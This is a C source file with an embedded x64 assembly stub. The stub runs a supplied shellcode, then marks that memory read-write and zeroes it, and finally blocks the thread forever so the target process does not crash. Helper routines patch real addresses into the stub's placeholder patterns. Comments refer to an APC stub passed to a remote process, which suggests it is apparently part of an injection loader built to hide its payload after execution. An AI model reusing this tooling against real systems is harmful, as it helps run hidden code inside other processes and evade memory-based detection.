#include <windows.h>
#include <stdio.h>

/*

;-------------------------------------------------------;
;   Author  => GlenX                                    ;
;   Date    => July 9, 2026                             ;
;   Compile => nasm -f bin -O3 -o stub.bin stub.asm     ;
;-------------------------------------------------------;


[BITS 64]

; The C caller must resolve the following functions and overwrite the placeholders
; VirtualProtect
; WaitForSingleObject
;
; In addition, the C caller must overwrite the placeholder for shellcode address and size with the actual values


fire:
	sub rsp, 20h                        ; shadow stack

	; Run Shellcode
	mov rax, 1111111111111111h          ; shellcode
	call rax                            ; Invoke shellcode


	; Change to RW - VirtualProtect
	mov rcx, 1111111111111111h          ; LPVOID lpAddress
	mov rdx, 2222222222222222h          ; SIZE_T dwSize - Note: VirtualProtect will always free a page
	mov r8, 4h                          ; 0x04 PAGE_READWRITE
	push 0                              ; Alloc space in the stack
	lea r9, [rsp]                       ; ptr to OldProtect - VirtualProtect requires a valid pointer for OldProtect otherwise it will fail
	mov rax, 3333333333333333h          ; VirtualProtect
	call rax                            ; Call VirtualProtect(shellcode, size, PAGE_READWRITE, oldProtect)


	; Cleanup
	;mov     rdi, 0xdeadbeefdeadbeef ; dst
	;mov     rcx, 0xff               ; size
	;xor     al, al                  ; value = 0
	;rep     stosb                   ; stosb stores the byte in al into the memory address pointed to by rdi, then increments (or decrements, depending on the direction flag) rdi by 1

	mov     rcx, 2222222222222222h      ; size
	mov     rax, 1111111111111111h      ; dst
	xor     edx, edx                    ; i = 0

.loop:
	cmp     rdx, rcx
	jge     .done
	mov     byte [rax + rdx], 0
	inc     rdx
	jmp     .loop

.done:


	; This is a very ugly workaround to not crash the target process
	; We call WaitForSingleObject((HANDLE)-1, INFINITE)
	; so that the thread will never return
	mov rcx, -1
	mov rdx, 00000000FFFFFFFFh
	mov rax, 4444444444444444h          ; WaitForSingleObject
	call rax
	add rsp, 28h                        ; Clear off the stack - This will never execute

*/

unsigned char stub_waitForSingleObject_shellcode_bin[] = {
  0x48, 0x83, 0xec, 0x20, 0x48, 0xb8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
  0x11, 0x11, 0xff, 0xd0, 0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
  0x11, 0x11, 0x48, 0xba, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
  0x41, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x4c, 0x8d, 0x0c, 0x24,
  0x48, 0xb8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0xff, 0xd0,
  0x48, 0xb9, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x48, 0xb8,
  0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x31, 0xd2, 0x48, 0x39,
  0xca, 0x7d, 0x09, 0xc6, 0x04, 0x10, 0x00, 0x48, 0xff, 0xc2, 0xeb, 0xf2,
  0x48, 0xc7, 0xc1, 0xff, 0xff, 0xff, 0xff, 0xba, 0xff, 0xff, 0xff, 0xff,
  0x48, 0xb8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0xff, 0xd0,
  0x48, 0x83, 0xc4, 0x28
};
unsigned int stub_waitForSingleObject_shellcode_bin_len = 124;










#define STUB_BUF stub_waitForSingleObject_shellcode_bin
#define STUB_SIZE stub_waitForSingleObject_shellcode_bin_len


void hexDump(const char* desc, const void* addr, const int len) {
	int i;
	unsigned char buff[17];
	const unsigned char* pc = (const unsigned char*)addr;

	// Output description if given.

	if (desc != NULL)
		printf("%s:\n", desc);

	// Length checks.

	if (len == 0) {
		printf("  ZERO LENGTH\n");
		return;
	}
	else if (len < 0) {
		printf("  NEGATIVE LENGTH: %d\n", len);
		return;
	}

	// Process every byte in the data.

	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Don't print ASCII buffer for the "zeroth" line.

			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.

			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And buffer a printable ASCII character for later.

		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) // isprint() may be better.
			buff[i % 16] = '.';
		else
			buff[i % 16] = pc[i];
		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.

	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII buffer.

	printf("  %s\n", buff);
}



BOOL overwrite_pattern(char* buffer, unsigned int buffer_size, char* pattern, unsigned int pattern_size, char* data, unsigned int data_size)
{
	if (!buffer || !pattern || pattern_size == 0 || pattern_size > buffer_size)
		return FALSE;

	BOOL res = FALSE;

	for (unsigned int i = 0; i <= buffer_size - pattern_size; i++)
	{
		if (memcmp(buffer + i, pattern, pattern_size) == 0)
		{
			unsigned int copy_size = (data_size < pattern_size) ? data_size : pattern_size;

			if (copy_size > 0 && data)
				memcpy(buffer + i, data, copy_size);

			if (copy_size < pattern_size)
				memset(buffer + i + copy_size, 0, pattern_size - copy_size);

			res = TRUE;
			//return TRUE;
		}
	}

	return res;
}



// Allocates a new buffer with malloc()
// Copies the shellcode stub into the new buffer
char* get_stub_buffer()
{

	char* buffer = NULL;
	char* origin_buffer = NULL;
	unsigned int origin_buffer_size = 0;

	origin_buffer = STUB_BUF;
	origin_buffer_size = STUB_SIZE;

	// Allocate buffer memory in heap
	buffer = malloc(origin_buffer_size);
	if (buffer == NULL)
	{
		printf("Could not allocate buffer for APC stub\n");
		return NULL;
	}

	// Copy stub into new buffer
	memcpy(buffer, origin_buffer, origin_buffer_size);

	return buffer;
}


// Overwrite pattern with addr in buffer
BOOL set_addr_in_stub(char* buffer, unsigned int buffer_size, char* pattern, char* addr)
{
	BOOL overwrite_res = FALSE;


	char* f_ptr = addr;

	overwrite_res = overwrite_pattern(
		buffer,
		buffer_size,
		pattern,
		8,
		(char*)&f_ptr,
		8
	);


	if (!overwrite_res)
	{
		printf("Failed to overwrite pattern\n");
		return FALSE;
	}

	return TRUE;

}

unsigned int get_stub_shellcode_size()
{
	return STUB_SIZE;
}

/*
* 
* Return a buffer allocated in the heap containing a shellcode stub 
* The shellcode stub will do the following 
* - Run the shellcode pointed by pShellcode
* - Cleanup the shellcode memory area: VirtualProtect() + zero memory
* - Call WaitForSingleObject(-1 , INFINITE) to prevent the function to ever return
* 
* NB: IT IS RESPONSIBILITY OF THE CALLER TO FREE THE RETURNED BUFFER AFTER IT HAS BEEN USED
* 
*/
char * get_stub_shellcode(char *pShellcode, SIZE_T sh_size)
{
	BOOL overwrite_res = FALSE;
	char* buffer = NULL;
	unsigned int buffer_size = 0;

	HANDLE hNtdll = INVALID_HANDLE_VALUE;

	// Function Pointers
	char* pWaitForSingleObject = NULL;
	char* pNtTestAlert = NULL;
	char* pNtQueueApcThread = NULL;
	char* pVirtualProtect = NULL;



	char sh_pattern[] = { 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11 };
	char sh_size_pattern[] = { 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22 };
	char VirtualProtect_pattern[] = { 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33 };
	char WaitForSingleObject_pattern[] = { 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44 };

	if (pShellcode == NULL)
	{
		printf("pointer to shellcode buffer is NULL\n");
		return NULL;
	}

	// Get new buffer with APC shellcode to be passed to the remote process
	buffer = get_stub_buffer();

	if (buffer == NULL)
	{
		printf("stub buffer is NULL\n");
		return NULL;
	}

	buffer_size = get_stub_shellcode_size();

	hexDump("before", buffer, buffer_size);


	// Resolve pointers
	pWaitForSingleObject = WaitForSingleObject;
	pVirtualProtect = VirtualProtect;


	printf("pShellcode = 0x%p\n", pShellcode);
	printf("pWaitForSingleObject = 0x%p\n", pWaitForSingleObject);
	printf("pVirtualProtect = 0x%p\n", pVirtualProtect);


	// Set pointers and values in stub
	overwrite_res = set_addr_in_stub(buffer, buffer_size, sh_pattern, pShellcode);
	if (!overwrite_res)
	{
		printf("Could not write pointer in stub\n");
		return NULL;
	}


	overwrite_res = set_addr_in_stub(buffer, buffer_size, sh_size_pattern, (PVOID)sh_size);
	if (!overwrite_res)
	{
		printf("Could not write pointer in stub\n");
		return NULL;
	}


	overwrite_res = set_addr_in_stub(buffer, buffer_size, VirtualProtect_pattern, pVirtualProtect);
	if (!overwrite_res)
	{
		printf("Could not write pointer in stub\n");
		return NULL;
	}

		
	overwrite_res = set_addr_in_stub(buffer, buffer_size, WaitForSingleObject_pattern, pWaitForSingleObject);
	if (!overwrite_res)
	{
		printf("Could not write pointer in stub\n");
		return NULL;
	}

	hexDump("after", buffer, buffer_size);


	return buffer;
}



